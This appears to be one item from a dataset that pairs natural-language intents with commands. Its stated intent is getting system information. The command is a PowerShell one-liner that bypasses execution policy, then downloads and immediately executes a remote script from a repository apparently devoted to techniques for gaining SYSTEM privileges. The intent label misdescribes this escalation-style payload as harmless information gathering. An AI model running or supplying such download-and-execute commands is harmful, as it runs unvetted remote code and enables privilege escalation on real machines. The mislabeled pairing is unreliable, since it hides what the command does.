# Natural language intent:
# Download and execute a PowerShell script from a GitHub repository to get system information.

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')"
